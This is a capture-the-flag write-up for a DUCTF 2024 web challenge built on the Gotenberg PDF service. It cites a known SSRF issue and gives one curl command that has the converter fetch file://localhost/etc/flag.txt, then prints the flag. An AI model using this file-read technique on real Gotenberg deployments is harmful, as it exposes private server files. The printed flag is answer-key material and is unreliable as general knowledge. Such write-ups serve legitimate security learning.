# hah got em
Solved by **Shroomish**

## Question
Deez nutz\
Hah got em\
...\
Oh by the way I love using my new microservice parsing these arrest reports to PDF.

## Solution
Looking at the provided Dockerfile, the application uses Gotenberg.\
There was a SSRF issue reported https://github.com/gotenberg/gotenberg/issues/261\
We referred their official Dev documentation to learn other path and queries https://gotenberg.dev/

```
curl -X POST "https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/url" -F "url=file://localhost/etc/flag.txt" -o output.pdf
```

### Flag
`DUCTF{dEeZ_r3GeX_cHeCK5_h4h_g0t_eM}`
